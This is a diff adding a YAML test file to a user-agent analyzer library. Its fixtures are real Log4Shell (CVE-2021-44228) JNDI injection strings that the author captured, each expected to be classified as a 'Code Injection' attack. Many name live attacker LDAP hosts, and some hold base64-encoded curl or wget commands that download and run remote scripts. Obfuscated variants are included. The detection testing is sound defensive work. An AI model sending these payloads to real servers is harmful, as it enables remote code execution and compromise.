@@ -1,0 +1,372 @@
+#
+# Yet Another UserAgent Analyzer
+# Copyright (C) 2013-2022 Niels Basjes
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+# https://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an AS IS BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+#
+
+isCodeInjection: &isCodeInjection
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemVersionMajor          : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemNameVersionMajor      : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Code Injection'
+      HackerToolkit                        : 'Unknown'
+
+isCodeInjectionSyntaxError: &isCodeInjectionSyntaxError
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemVersionMajor          : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemNameVersionMajor      : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Code Injection'
+      HackerToolkit                        : 'Unknown'
+      __SyntaxError__                      : 'true'
+
+config:
+# Real attempts I got at home trying Apache Log4j RCE CVE-2021-44228
+- test:
+    input:
+      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.155.205.233:12344/Basic/Command/Base64/SSByZW1vdmVkIHRoZSBhY3R1YWwgaGFjay4=}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:dns://45.83.64.1/securityscan-http80}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClass}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:dns://45-138-228-54.scanworld.net/ua}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${${::-j}ndi:dns://45.83.64.1/securityscan-zi2wx4kob5jybfqv}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://121.140.99.236:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://142.93.172.227:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://162.241.127.99:1389/a}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://162.241.127.99/ae4d14d64d1cbfe8042b12f47bc5e3e43w/howto.basjes.nl/?id=${jndi:ldap}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://162.241.127.99/ae4d14d64d1cbfe8042b12f47bc5e3e43w/niels.basjes.nl/?id=${jndi:ldap}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://162.241.127.99/ae4d14d64d1cbfe8042b12f47bc5e3e43w/try.yauaa.basjes.nl/?id=${jndi:ldap}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://162.241.127.99/ae4d14d64d1cbfe8042b12f47bc5e3e43w/www.howto.basjes.nl/?id=${jndi:ldap}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://162.55.90.26/764077110/C}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://165.227.212.62:389/Basic/Command/Base64/Y3VybCAtTCBwcml2YXRla2V5c3dlZXBlci5jZi9jaGVjayB8IGJhc2ggLXM==}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://167.71.13.196:2222/lx-ffff2d8ae4365000081a95b7610000000080b370}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://179.43.175.101:1389/jedmdg}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://185.224.139.151:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://185.246.87.50:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://192.46.216.224:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://205.185.115.217:47324/a}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://209.141.32.206:1389/a}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://209.141.32.206:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://209.141.32.206:389/Basic/Command/Base64/Y3VybCAtTCBwcml2YXRla2V5c3dlZXBlci5jZi9jaGVjayB8IGJhc2ggLXM==}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://31.131.16.127:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://45.130.229.168:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC80NS4xMzguMjI4LjU0OjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzQ1LjEzOC4yMjguNTQ6ODApfGJhc2g=}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://5.101.118.127:1389/Exploit}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://78.31.71.248:1389/8el8iu}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://78.31.71.248:1389/gbqx6h}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://78.31.71.248:1389/gfwwq7}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://78.31.71.248:1389/oeass4}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://81.240.29.103:389/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://divd-88c002fefbe27b4768cedc55dec7234d_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://divd-88c002fefbe27b4768cedc55dec7234d_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://divd-a16dbd93667769642910a6ed61354dc6_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://divd-a16dbd93667769642910a6ed61354dc6_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://http80useragent.kryptoslogic-cve-2021-44228.com/http80useragent}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c6vhknej8c872ot0sg50_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c6vhknej8c872ot0sg5g_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c7266guj8c872ooub5lg_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c7266guj8c872ooub5m0_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c72fh76j8c872opchik0_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c72fh76j8c872opchikg_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c72k3lmj8c872opjl8m0_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c72k3lmj8c872opjl8mg_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c73pn46j8c872orc95eg_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c73pn46j8c872orc95f0_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjectionSyntaxError
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c73sq86j8c872orh0ni0_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c73sq86j8c872orh0nig_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c74lljmj8c872osmvcs0_${date:YYYYMMddHHmmss}_http_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:ldap://sidn-divd-c74lljmj8c872osmvcsg_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${jndi:${lower:l}${lower:d}a${lower:p}://world80.log4j.bin${upper:a}ryedge.io:80/callback}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 't(''${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}'')'
+    expected: *isCodeInjectionSyntaxError
+
+- test:
+    input:
+      user_agent_string: 't(''${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3N0YXI7IGN1cmwgLU8gaHR0cDovLzIuNTguMTQ5LjIwNi9zdGFyOyBjaG1vZCA3Nzcgc3RhcjsgLi9zdGFyIGV4cGxvaXQ=}'
+    expected: *isCodeInjectionSyntaxError
+
+- test:
+    input:
+      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://162.241.127.99:1389/Basic/Command/Base64/KGN1cmwgLXMgMTYyLjI0MS4xMjcuOTk6MTM4OS9uaWVscy5iYXNqZXMubmx8fHdnZXQgLXEgLU8tIDE2Mi4yNDEuMTI3Ljk5OjEzODkvbmllbHMuYmFzamVzLm5sKXxiYXNo'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://162.241.127.99:5074/Basic/Command/Base64/KGN1cmwgLXMgMTYyLjI0MS4xMjcuOTk6NTA3NC90cnkueWF1YWEuYmFzamVzLm5sfHx3Z2V0IC1xIC1PLSAxNjIuMjQxLjEyNy45OTo1MDc0L3RyeS55YXVhYS5iYXNqZXMubmwpfGJhc2g='
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC80NS4xMzguMjI4LjU0OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzQ1LjEzOC4yMjguNTQ6ODApfGJhc2g='
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC80NS4xMzguMjI4LjU0OjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzQ1LjEzOC4yMjguNTQ6ODApfGJhc2g='
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6r91da5aulgp8mfjcu0cg5kcnoyyj4qq.interactsh.com}'
+    expected: *isCodeInjection
+
